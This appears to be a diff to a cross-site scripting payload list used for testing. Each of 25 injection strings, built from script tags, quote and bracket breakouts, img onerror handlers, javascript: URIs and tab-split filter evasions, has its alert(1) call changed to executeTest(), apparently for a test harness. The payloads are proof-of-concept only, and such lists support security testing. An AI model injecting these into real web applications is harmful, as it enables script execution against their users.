@@ -1,25 +1,25 @@
-<script>alert(1)</script>
-><script>alert(1)</script>
-"><script>alert(1)</script>
-'><script>alert(1)</script>
-';alert(1)</script>
-";alert(1)</script>
-"';alert(1)</script>
-'";alert(1)</script>
-"});alert(1)</script>
-"}));alert(1)</script>
-"})));alert(1)</script>
-<img src=alert(1) onerror=alert(1)>
-><img src=alert(1) onerror=alert(1)>
-<a href="javascript:alert(1)">
-><a href="javascript:alert(1)">
-'><a href="javascript:alert(1)">
-"><a href="javascript:alert(1)">
-<a href="javas	cript:alert(1)">
-><a href="javas		cript:alert(1)">
-'><a href="javas	cript:alert(1)">
-"><a href="javas	cript:alert(1)">
-<iframe src="javascript:alert(1)">
-><iframe src="javascript:alert(1)">
-'><iframe src="javascript:alert(1)">
-"><iframe src="javascript:alert(1)">
+<script>executeTest()</script>
+><script>executeTest()</script>
+"><script>executeTest()</script>
+'><script>executeTest()</script>
+';executeTest()</script>
+";executeTest()</script>
+"';executeTest()</script>
+'";executeTest()</script>
+"});executeTest()</script>
+"}));executeTest()</script>
+"})));executeTest()</script>
+<img src=executeTest() onerror=executeTest()>
+><img src=executeTest() onerror=executeTest()>
+<a href="javascript:executeTest()">
+><a href="javascript:executeTest()">
+'><a href="javascript:executeTest()">
+"><a href="javascript:executeTest()">
+<a href="javas	cript:executeTest()">
+><a href="javas		cript:executeTest()">
+'><a href="javas	cript:executeTest()">
+"><a href="javas	cript:executeTest()">
+<iframe src="javascript:executeTest()">
+><iframe src="javascript:executeTest()">
+'><iframe src="javascript:executeTest()">
+"><iframe src="javascript:executeTest()">
